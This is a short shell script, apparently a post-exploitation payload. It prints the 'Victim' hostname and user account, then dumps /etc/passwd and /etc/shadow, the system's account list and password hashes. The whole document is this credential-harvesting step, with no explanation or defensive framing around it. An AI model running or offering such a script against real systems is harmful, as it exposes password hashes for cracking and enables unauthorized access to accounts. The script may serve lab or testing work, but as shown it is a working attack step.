# Set the internal field separator
IFS=$'\n'

echo "================================"
echo -n "Victim hostname: "; hostname
echo -n "Victim user account: "; whoami
echo "********************************"
cat "/etc/passwd"
echo "********************************"
cat "/etc/shadow"
echo "================================"

unset IFS
exit
